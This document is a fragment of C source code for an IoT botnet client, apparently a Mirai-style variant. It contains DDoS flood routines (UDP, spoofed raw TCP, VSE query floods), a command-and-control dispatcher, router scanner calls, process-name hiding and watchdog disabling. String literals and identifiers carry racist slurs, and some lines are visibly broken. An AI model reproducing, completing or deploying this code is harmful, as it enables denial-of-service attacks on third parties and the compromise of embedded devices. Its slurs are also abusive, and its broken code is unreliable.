    free(data);
}
void rand_hex(unsigned char *ip, int port, int secs) {
int iSTD_Sock;
iSTD_Sock = socket(AF_INET, SOCK_DGRAM, 0);
time_t start = time(NULL);
struct sockaddr_in sin;
struct hostent *hp;
hp = gethostbyname(ip);
bzero((char*) &sin,sizeof(sin));
bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
sin.sin_family = hp->h_addrtype;
sin.sin_port = port;
unsigned int a = 0;
while(1){
char *randstrings[] = {"!@#$%^!&#^$#$^(#^(@#^", "\x37\x78\x37\x78\x37\x78\x37\x78" "\x43\x71\x35\x48\x76\x39\x38", "\x77\x75\x49\x69", "!@#$%^&(!@#$%@$@#", "\x48\x62\x6f\x42", "\x46\x41\x37\x78", "fuck_niggers", "\x37\x78\x4f\x37\x23", "S4YFUCKSBOYS!!!!!!", "\x4f\x37\x78\x36", "***@#*(@*($^&*%$%^&!@$^&gyFQ&^*^&%^&$^&", "\x75\x49\x69\x4b\x63\x48\x6c\x67\x46\x41\x30", "\x46\x41\x30", "\x48\x62\x6f\x42\x48\x62\x6f\x42\x48\x62\x6f\x42"};
char *STD2_STRING = randstrings[rand() % (sizeof(randstrings) / sizeof(char *))];
if (a >= 50)
{
send(iSTD_Sock, STD2_STRING, STD_PIGZ, 0);
connect(iSTD_Sock,(struct sockaddr *) &sin, sizeof(sin));
if (time(NULL) >= start + secs)
{
close(iSTD_Sock);
_exit(0);
}
a = 0;
}
a++;
}
}
void sendKILLALL(unsigned char *target, int port, int timeEnd, int packetsize)
{
    int i, fd;

    fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);

    struct sockaddr_in addr;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(target);
    addr.sin_family = AF_INET;

    char packet[4096];
    struct iphdr *iph = (struct iphdr *) packet;
    struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
   // struct pseudo_header psh;
    char ip[16];

    memset (packet, 0, 4096);


    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof (struct iphdr) + sizeof (struct tcphdr);
    iph->id = htonl (54321); 
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0; 
    iph->saddr = inet_ntoa(ourIP);
    iph->daddr = inet_addr(target);

    iph->check = csum((unsigned short *) packet, iph->tot_len >> 1);

    tcph->source = htons(443);
    tcph->dest = htons(443);
    tcph->seq = 0;
    tcph->ack_seq = 0;
    tcph->doff = 5;
    tcph->fin=0;
    tcph->syn=1;
    tcph->rst=0;
    tcph->psh=0;
    tcph->ack=1;
    tcph->urg=1;
    tcph->window = htons(1460);
    tcph->check = 0;
    tcph->urg_ptr = 0;
    tcph->check = 0;
    tcph->check = tcpcsum(iph, tcph);

    //sh.source_address = inet_addr(ip);
    //sh.dest_address = sin.sin_addr.s_addr;
    //sh.placeholder = 0;
    //sh.protocol = IPPROTO_TCP;
    //sh.tcp_length = htons(20);

    time_t start = time(0);

    while(1)
    {
        if(time(0) >= start + timeEnd)
            kill(getpid(), 9);
        sendto(fd, packet, iph->tot_len, 0, (struct sockaddr *)&addr, sizeof(struct sockaddr_in));
    }
}
void makevsepacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize)
{
    char *vse_payload;
    int vse_payload_len;
    vse_payload = "\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79 + /x54/x53/x6f/x75/x72/x63/x65/x20/x45/x6e/x67/x69/x6e/x65/x20/x51/x75/x65/x72/x79 rfdknjms", &vse_payload_len;
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + packetSize + vse_payload_len;
        iph->id = rand_cmwc();
        iph->frag_off = 0;
        iph->ttl = MAXTTL;
        iph->protocol = protocol;
        iph->check = 0;
        iph->saddr = source;
        iph->daddr = dest;
}////S4tan's USB
void vseattack(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval, int sleepcheck, int sleeptime)
{
    char *vse_payload;
    int vse_payload_len;
    vse_payload = "\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79 + /x54/x53/x6f/x75/x72/x63/x65/x20/x45/x6e/x67/x69/x6e/x65/x20/x51/x75/x65/x72/x79 rfdknjms", &vse_payload_len;
    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    if(port == 0) dest_addr.sin_port = rand_cmwc();
    else dest_addr.sin_port = htons(port);
    if(getHost(target, &dest_addr.sin_addr)) return;
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
    register unsigned int pollRegister;
    pollRegister = pollinterval;
    if(spoofit == 32) {
    int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(!sockfd) {
    return;
    }
    unsigned char *buf = (unsigned char *)malloc(packetsize + 1);
    if(buf == NULL) return;
    memset(buf, 0, packetsize + 1);
    makeRandomStr(buf, packetsize);
    int end = time(NULL) + timeEnd;
    register unsigned int i = 0;
    register unsigned int ii = 0;
    while(1) {
    sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
    if(i == pollRegister) {
    if(port == 0) dest_addr.sin_port = rand_cmwc();
    if(time(NULL) > end) break;
    i = 0;
    continue;
                    }
    i++;
    if(ii == sleepcheck) {
    usleep(sleeptime*1000);
    ii = 0;
    continue;
                    }
    ii++;
            }
            } else {
    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if(!sockfd) {
    return;
                }
    int tmp = 1;
    if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0) {
    return;
                }
    int counter = 50;
    while(counter--) {
    srand(time(NULL) ^ rand_cmwc());
                }
    in_addr_t netmask;
    if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
    else netmask = ( ~((1 << (32 - spoofit)) - 1) );
    unsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize];
    struct iphdr *iph = (struct iphdr *)packet;
    struct udphdr *udph = (void *)iph + sizeof(struct iphdr);
    makevsepacket(iph, dest_addr.sin_addr.s_addr, htonl( getRandomIP(netmask) ), IPPROTO_UDP, sizeof(struct udphdr) + packetsize);
    udph->len = htons(sizeof(struct udphdr) + packetsize + vse_payload_len);
    udph->source = rand_cmwc();
    udph->dest = (port == 0 ? rand_cmwc() : htons(port));
    udph->check = 0;
    udph->check = (iph, udph, udph->len, sizeof (struct udphdr) + sizeof (uint32_t) + vse_payload_len);
    makeRandomStr((unsigned char*)(((unsigned char *)udph) + sizeof(struct udphdr)), packetsize);
    iph->check = csum ((unsigned short *) packet, iph->tot_len);
    int end = time(NULL) + timeEnd;
    register unsigned int i = 0;
    register unsigned int ii = 0;
    while(1) {
    sendto(sockfd, packet, sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (uint32_t) + vse_payload_len, sizeof(packet), (struct sockaddr *)&dest_addr, sizeof(dest_addr));
    udph->source = rand_cmwc();
    udph->dest = (port == 0 ? rand_cmwc() : htons(port));
    iph->id = rand_cmwc();
    iph->saddr = htonl( getRandomIP(netmask) );
    iph->check = csum ((unsigned short *) packet, iph->tot_len);
    if(i == pollRegister) {
    if(time(NULL) > end) break;
    i = 0;
    continue;
            }
    i++;
    if(ii == sleepcheck) {
    usleep(sleeptime*1000);
    ii = 0;
    continue;
                }
    ii++;
            }
        }
    }
void CnC(int argc, unsigned char *argv[]) 
{
    if(!strcmp(argv[0], "PLAIN")) 
       {
           if(argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[5]) == -1 || atoi(argv[5]) > 65536 || atoi(argv[5]) > 65500 || atoi(argv[4]) > 32 || (argc == 7 && atoi(argv[6]) < 1)) 
           { return;}
           unsigned char *ip = argv[1];
           int port = atoi(argv[2]);
           int time = atoi(argv[3]);
           int spoofed = atoi(argv[4]);
           int packetsize = atoi(argv[5]);
           int pollinterval = (argc > 6 ? atoi(argv[6]) : 1000);
           int sleepcheck = (argc > 7 ? atoi(argv[7]) : 1000000);
           int sleeptime = (argc > 8 ? atoi(argv[8]) : 0);
           if(strstr(ip, ",") != NULL)
           {
               unsigned char *hi = strtok(ip, ",");
               while(hi != NULL) 
               {
                   if(!listFork()) 
                   {
                       attack_udp(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                       _exit(0);
                    }
                    hi = strtok(NULL, ",");
                }
            } 
            else 
            {
                if (!listFork())
                {
                    attack_udp(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                    _exit(0);
                }
            }
            return;
        }
    if (!strcmp(argv[0], "TCP")) {
        if (argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[4]) > 32 ||
            (argc > 6 && atoi(argv[6]) < 0) || (argc == 8 && atoi(argv[7]) < 1)) { return; }
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        int spoofed = atoi(argv[4]);
        unsigned char *flags = argv[5];
        int pollinterval = argc == 8 ? atoi(argv[7]) : 10;
        int psize = argc > 6 ? atoi(argv[6]) : 0;
        if (strstr(ip, ",") != NULL) {
            unsigned char *hi = strtok(ip, ",");
            while (hi != NULL) {
                if (!listFork()) {
                    tcpfl00d(hi, port, time, spoofed, flags, psize, pollinterval);
                    _exit(0);
                }
                hi = strtok(NULL, ",");
            }
        } else {
            if (listFork()) { return; }
            tcpfl00d(ip, port, time, spoofed, flags, psize, pollinterval);
            _exit(0);
        }
    }
    if (!strcmp(argv[0], "STD")) {
        if (argc < 4 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 ||  atoi(argv[4]) > 65500) { return; }
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        int ps = atoi(argv[4]);

        if(!fork())
        {
            sstdstr(ip, port, time, ps);
            _exit(0);
        }
    }
    if(!strcmp(argv[0], "KILLALL"))
        {
                if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1 || atoi(argv[4]) < 1)
                {
                    return;
                }
                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);
                int packetsize = atoi(argv[4]);
                if(strstr(ip, ",") != NULL)
                {
                    unsigned char *hi = strtok(ip, ",");
                    while(hi != NULL)
                    {
                        if(!listFork())
                        {
                            sendKILLALL(hi, port, time, packetsize);
                            _exit(0);
                        }
                        hi = strtok(NULL, ",");
                    }
                } else {
                    if (listFork()) { return; }
                    sendKILLALL(ip, port, time, packetsize);
                    _exit(0);
                }
        }
    if (!strcmp(argv[0], "SHEX"))
    {
        if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
        {
            return;
        }
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        if(strstr(ip, ",") != NULL)
        {
            unsigned char *niggas = strtok(ip, ",");
            while(niggas != NULL)
            {
                if(!listFork())
                {
                    s4yniggerfl00d(niggas, port, time);
                    _exit(0);
                }
                niggas = strtok(NULL, ",");
            }
        } else {
            if (listFork()) { return; }
            s4yniggerfl00d(ip, port, time);
            _exit(0);
        }
    }
    if (!strcmp(argv[0], "RHEX"))
    {
        if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
        {
            return;
        }
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        if(strstr(ip, ",") != NULL)
        {
            unsigned char *niggas = strtok(ip, ",");
            while(niggas != NULL)
            {
                if(!listFork())
                {
                    rand_hex(niggas, port, time);
                    _exit(0);
                }
                niggas = strtok(NULL, ",");
            }
        } else {
            if (listFork()) { return; }
            rand_hex(ip, port, time);
            _exit(0);
        }
    }
    if(!strcmp(argv[0], "VSE")) {
            if(argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[5]) == -1 || atoi(argv[5]) > 65536 || atoi(argv[5]) > 65500 || atoi(argv[4]) > 32 || (argc == 7 && atoi(argv[6]) < 1)) {
            return;
            }
            unsigned char *ip = argv[1];
            int port = atoi(argv[2]);
            int time = atoi(argv[3]);
            int spoofed = atoi(argv[4]);
            int packetsize = atoi(argv[5]);
            int pollinterval = (argc > 6 ? atoi(argv[6]) : 1000);
            int sleepcheck = (argc > 7 ? atoi(argv[7]) : 1000000);
            int sleeptime = (argc > 8 ? atoi(argv[8]) : 0);
            if(strstr(ip, ",") != NULL) {
                unsigned char *hi = strtok(ip, ",");
                while(hi != NULL) {
                    if(!listFork()) {
                        vseattack(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                        _exit(0);
                    }
                    hi = strtok(NULL, ",");
                }
            } else {
                if (!listFork()){
                vseattack(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                _exit(0);
            }
        }
        return;
        }
    if (!strcmp(argv[0], "kill")) {
        unsigned long i;
        for (i = 0; i < numpids; i++) {
            if (pids[i] != 0 && pids[i] != getpid()) {
                kill(pids[i], 9);
                }
            }
        }
    }

int Conn() {
    unsigned char server[4096];
    memset(server, 0, 4096);
    if (LayerSock) {
        close(LayerSock);
        LayerSock = 0;
    }
    if (SRV + 1 == LST_SZ) SRV = 0;
    else SRV++;
    SZP(server, "%d.%d.%d.%d", KYT[SRV], KYT2[SRV], KYT3[SRV], KYT4[SRV]);

    LayerSock = socket(AF_INET, SOCK_STREAM, 0);

    if (!connectTimeout(LayerSock, server, port, 25)) return 1;

    return 0;
}

int main(int argc, unsigned char *argv[]) {
    if (LST_SZ <= 0) return 0;
    srand(time(NULL) ^ getpid());
    table_init();
    char name_buf[32], *tbl_exec_succ;
    int name_buf_len, t = 1, ifd, status, tbl_exec_succ_len = 0;
    pid_t pid1, pid2;
    huaweiscanner_scanner_init();
    realtekscanner_scanner_init();
#ifdef SCANNER
    rep_init();
    huaweiscanner_scanner_init();
    realtekscanner_scanner_init();
#endif
    
    rand_init();

    name_buf_len = ((rand_next() % 4) + 3) * 4;
    rand_alpha_str(name_buf, name_buf_len);
    name_buf[name_buf_len] = 0;
    strcpy(argv[0], name_buf);

    name_buf_len = ((rand_next() % 6) + 3) * 4;
    rand_alpha_str(name_buf, name_buf_len);
    name_buf[name_buf_len] = 0;
    prctl(ST_NM, name_buf);

    LOCAL_ADDR = util_local_addr();

    setsid();
    chdir("/");

    if(fork() > 0) return 0;

    signal(SIGPIPE, SIG_IGN);

    table_unlock_val(XOR_EXEC_SUCCESS);
    tbl_exec_succ = table_retrieve_val(XOR_EXEC_SUCCESS, &tbl_exec_succ_len);
    write(STDOUT, tbl_exec_succ, tbl_exec_succ_len);
    write(STDOUT, "\n", 1);
    table_lock_val(XOR_EXEC_SUCCESS);

    #ifdef KILLER
    killer_init();
    #endif

    // Watchdogs/IOCTL
    #ifdef IOCTL
    table_unlock_val(XOR_IOCTL_WATCH1);
    table_unlock_val(XOR_IOCTL_WATCH2);
    table_unlock_val(XOR_IOCTL_WATCH3);
    table_unlock_val(XOR_IOCTL_WATCH4);
    table_unlock_val(XOR_IOCTL_WATCH5);

    if ((ifd = open(table_retrieve_val(XOR_IOCTL_WATCH1, NULL), 2)) != -1 ||
        (ifd = open(table_retrieve_val(XOR_IOCTL_WATCH2, NULL), 2)) != -1 ||
        (ifd = open(table_retrieve_val(XOR_IOCTL_WATCH3, NULL), 2)) != -1 ||
        (ifd = open(table_retrieve_val(XOR_IOCTL_WATCH4, NULL), 2)) != -1 ||
        (ifd = open(table_retrieve_val(XOR_IOCTL_WATCH5, NULL), 2)) != -1)
    {
        ioctl(ifd, 0x80045704, &t);
        close(ifd);
        ifd = 0;
    }
    table_lock_val(XOR_IOCTL_WATCH1);
    table_lock_val(XOR_IOCTL_WATCH2);
    table_lock_val(XOR_IOCTL_WATCH3);
    table_lock_val(XOR_IOCTL_WATCH4);
    table_lock_val(XOR_IOCTL_WATCH5);
    #endif

    if (pid1 = fork()) 
    {
        waitpid(pid1, &status, 0);
        exit(0);
    } 
    else if (!pid1) 
    {
        if (pid2 = fork()) 
        {
            exit(0);
        } 
    }
    while (1) 
    {
        if (Conn()) { sleep(3); continue; }
        LayerPrint(LayerSock, "%s", GB());

        char commBuf[4096];
        int got = 0;
        int i = 0;
        while((got = recvLine(LayerSock, commBuf, 4096)) != -1)
        {
            for (i = 0; i < numpids; i++) if (waitpid(pids[i], NULL, WNOHANG) > 0) {
                unsigned int *newpids, on;
                for (on = i + 1; on < numpids; on++) pids[on-1] = pids[on];
                pids[on - 1] = 0;
                numpids--;
                newpids = (unsigned int*)malloc((numpids + 1) * sizeof(unsigned int));
                for (on = 0; on < numpids; on++) newpids[on] = pids[on];
                free(pids);
                pids = newpids;
            }

            commBuf[got] = 0x00;

            trim(commBuf);
            
            unsigned char *message = commBuf;

            if(*message == '/')
            {
                unsigned char *nickMask = message + 1;
                while(*nickMask != ' ' && *nickMask != 0x00) nickMask++;
                if(*nickMask == 0x00) continue;
                *(nickMask) = 0x00;
                nickMask = message + 1;

                message = message + strlen(nickMask) + 2;
                while(message[strlen(message) - 1] == '\n' || message[strlen(message) - 1] == '\r') message[strlen(message) - 1] = 0x00;

                unsigned char *command = message;
                while(*message != ' ' && *message != 0x00) message++;
                *message = 0x00;
                message++;

                unsigned char *tmpcommand = command;
                while(*tmpcommand) { *tmpcommand = toupper(*tmpcommand); tmpcommand++; }

                unsigned char *params[10];
                int paramsCount = 1;
                unsigned char *pch = strtok(message, " ");
                params[0] = command;

                while(pch)
                {
                    if(*pch != '\n')
                    {
                        params[paramsCount] = (unsigned char *)malloc(strlen(pch) + 1);
                        memset(params[paramsCount], 0, strlen(pch) + 1);
                        strcpy(params[paramsCount], pch);
                        paramsCount++;
                    }
                    pch = strtok(NULL, " ");
                }

                CnC(paramsCount, params);

                if(paramsCount > 1)
                {
                    int q = 1;
                    for(q = 1; q < paramsCount; q++)
                    {
                        free(params[q]);
                    }
                }
            }
        }
    }
    return 0;
}
